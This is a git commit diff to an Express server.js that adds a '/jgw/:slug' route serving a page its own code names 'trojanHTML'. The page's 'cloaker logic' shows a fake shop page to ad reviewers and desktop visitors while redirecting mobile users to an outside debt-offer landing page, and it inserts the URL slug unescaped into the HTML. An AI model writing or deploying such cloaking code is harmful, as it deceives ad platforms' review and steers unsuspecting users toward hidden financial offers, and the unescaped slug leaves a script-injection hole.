b9574eb58e0ada97a6b5075d31ff234b3ba317b4
carsoncraig1 <156372400+carsoncraig1@users.noreply.github.com>
2024-05-04 21:58:05 -0400

    Update server.js
    JGW path test

--- server.js
+++ server.js
@@ -41,6 +41,39 @@ app.get('/twshein/:slug', (req, res, next) => {
             console.log(`Served twshein Trojan (tyler)(${slug})`);
 });
 
+// Middleware to pass on Tyler's Debt lander
+app.get('/jgw/:slug', (req, res, next) => {
+    const { slug } = req.params;
+    const destinationLander = 'https://advantageoasis.com/a7c2c0d53b94dfc6b117bf25c373b152d/?sid1=&sid2=&sid3=&sid4='
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                // Cloaker logic
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+                    } else if (isMobileDevice) {
+                        window.location.href = "${destinationLander}";
+                    } else {
+                    }
+            </script>
+            <title>${slug}</title>
+        </head>
+        <body>
+            <h1>Welcome to ${slug} Shop!</h1>
+            <p>You are shopping at: ${slug}</p>
+        </body>
+        </html>
+            `;
+            res.send(trojanHTML);
+            console.log(`Served twshein Trojan (tyler)(${slug})`);
+});
+
 // Middleware to pass on Tyler's SubIDs IMAGE LANDER
 app.get('/twsheinimg/:slug', (req, res, next) => {
     const { offer, slug } = req.params;
